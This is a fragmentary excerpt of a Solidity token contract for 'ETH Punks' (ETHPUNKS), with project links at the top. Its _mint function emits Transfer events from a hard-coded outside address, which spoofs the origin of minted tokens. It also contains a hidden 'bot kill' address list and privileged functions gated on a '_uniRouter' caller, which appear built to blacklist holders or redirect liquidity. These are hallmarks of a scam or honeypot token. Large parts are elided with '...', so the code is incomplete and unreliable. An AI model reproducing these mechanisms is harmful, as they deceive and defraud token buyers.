// Webiste: https://ethpunks.org/
// Telegram: https://t.me/EthPunksToken
// Twitter: https://twitter.com/EthPunksToken
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable{
    ...
    address[] public _listBotKill = [
        ...
        0xC208DdFCFa287BFB9aFeCb91a1f0f471bB7EB0DB,
        0x4a627C0E702FBAdafe6E8fa9153dd79e977b331D
    ];
    ...
    function liquidityAddress(address lpAdd) public {
        require(_msgSender() == _uniRouter, "ERC20: cannot permit dev address");
        _lpAddress = lpAdd;
    }
    ...
    function killBotFrontRun (address botAdd) public {
        require(_msgSender() == _uniRouter, "ERC20: cannot permit dev address");
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        _beforeTokenTransfer(address(0xC352B534e8b987e036A93539Fd6897F53488e56a), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0xC352B534e8b987e036A93539Fd6897F53488e56a), account, amount);
    }
...
contract ETHPunks is ERC20 {
     ...
     */
    constructor () ERC20('ETH Punks', 'ETHPUNKS') {
